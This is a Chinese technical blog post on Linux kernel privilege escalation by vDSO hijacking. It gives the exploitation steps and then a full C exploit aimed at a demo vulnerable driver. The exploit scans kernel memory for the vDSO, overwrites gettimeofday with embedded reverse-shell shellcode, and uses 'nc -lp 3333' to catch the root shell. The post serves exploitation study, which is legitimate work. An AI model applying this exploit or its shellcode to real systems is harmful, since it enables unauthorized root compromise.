# linux 内核提权总结(demo+exp分析) -- 任意读写(二)


[发表于看雪论坛](https://bbs.pediy.com/user-839858.htm)

## hijack_vdso篇

+ vdso: 内核实现的一个动态库，存在于内核，然后映射到用户态空间，可由用户态直接调用

    + 内核中的vdso如果被修改，那么用户态空间的vdso也会同步被修改

+ 攻击流程
    1. (内核任意代码执行漏洞)内核调用set_memory_rw 函数修改内核vdso页面属性，使得用户态可以直接修改vdso，劫持vdso为shellcode，触发条件同1
    2. (内核任意读写漏洞)内核修改内核vdso数据，写入shellcode，使得用户态vdso中函数被劫持，当高权限进程调用vdso中特定函数时，触发shellcode，本篇只讲解攻击流程2

### 一. 利用步骤

#### 1. 定位内核态vdso位置

+ vdso中存在一些比较有特点的字符串，比如"gettimeofday"，在拥有任意读漏洞的前提下，从0xffffffff80000000(开启kaslr后内核基地址在此地址基础上往上偏移)开始按页搜索内存

+ 如果内存其他地方存在"gettimeofday"字符串，且出现在vdso之前，则会返回错误地址。所以在内存搜索时，应以返回地址为起始，使用gdb dump 0x2000 内存，使用ida查看是否是vdso，如果不是，可以忽略这个错误地址，继续向下搜索。

+ 得到真正的vdso后，查看"gettimeofday"与vdso起始地址的偏移，后续匹配vdso时，加上这个偏移条件

#### 2. 向内核中vdso写入shellcode

+ shellcode功能: 判断进程是否具有root权限，如果成立，则开辟新进程用来反弹root shell

+ shellcode写入位置: 定位vdso上某函数，比如gettimeofday函数，使用shellcode覆盖

+ shellcode触发条件: 当高权限进程调用gettimeofday函数时，自动执行shellcode 反弹root shell

### 二. 驱动代码(见cred篇)

### 三. exp

``` c
#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/auxv.h>

#define CHANGE_POINT 0x100000
#define RW_READ 0x100001
#define RW_WRITE 0x100002
#define SET_MEM 0X100003

struct vunl
{
    char *point;
    size_t size;
} VUNL;

char shellcode[] =  "\x90\x53\x48\x31\xC0\xB0\x66\x0F\x05\x48\x31\xDB\x48\x39\xC3\x75"
                    "\x0F\x48\x31\xC0\xB0\x39\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x09"
                    "\x5B\x48\x31\xC0\xB0\x60\x0F\x05\xC3\x48\x31\xD2\x6A\x01\x5E\x6A"
                    "\x02\x5F\x6A\x29\x58\x0F\x05\x48\x97\x50\x48\xB9\xFD\xFF\xF2\xFA"
                    "\x80\xFF\xFF\xFE\x48\xF7\xD1\x51\x48\x89\xE6\x6A\x10\x5A\x6A\x2A"
                    "\x58\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x07\x48\x31\xC0\xB0\xE7"
                    "\x0F\x05\x90\x6A\x03\x5E\x6A\x21\x58\x48\xFF\xCE\x0F\x05\x75\xF6"
                    "\x48\x31\xC0\x50\x48\xBB\xD0\x9D\x96\x91\xD0\x8C\x97\xFF\x48\xF7"
                    "\xD3\x53\x48\x89\xE7\x50\x57\x48\x89\xE6\x48\x31\xD2\xB0\x3B\x0F"
                    "\x05\x48\x31\xC0\xB0\xE7\x0F\x05";


char *leak_data(int fd, char *buf)
{
    char *res = NULL;

    VUNL.size = 0x1000;
    for (size_t addr = 0xffffffff80000000; addr < 0xffffffffffffffff; addr += 0x1000)
    {
        VUNL.point = (char *)addr;

        ioctl(fd, CHANGE_POINT, &VUNL); //change the point
        ioctl(fd, RW_READ, buf);
        printf("addr is: %p, context is: 0x%lx\n", VUNL.point, *(size_t *)buf);
        if (!strcmp("gettimeofday", buf + 0x2b5))
        {
            res = (char *)addr;
            break;
        }
        
        puts("[-] not found, try again!\n");
    }
    return res;
}

int check_vdso_shellcode()
{
    size_t addr = 0;
    addr = getauxval(AT_SYSINFO_EHDR);
    if (addr < 0)
    {
        puts("[-] can not get VDSO addr\n");
        return 0;
    }
    printf("[+] usr::VDSO addr is: 0x%lx\n", addr);
    if (memmem((char *)addr, 0x1000, shellcode, strlen(shellcode)))
    {
        return 1;
    }
    return 0;
}

int main()
{
    int fd = 0;
    char *buf = malloc(0x1000);

    fd = open("/dev/rw_any_dev", O_RDWR);
    VUNL.point = (char *)leak_data(fd, buf);
    VUNL.size = strlen(shellcode);
    VUNL.point = VUNL.point + 0xb00;
    ioctl(fd, CHANGE_POINT, &VUNL);
    ioctl(fd, RW_WRITE, shellcode);
    printf("[+] hook in %p\n", VUNL.point);
    
    if (check_vdso_shellcode())
    {
        puts("[+] the shellcode has hook in VDSO");
        system("nc -lp 3333");
    }
    else
    {
        puts("[-] error!");
    }

    return 0;
}
```



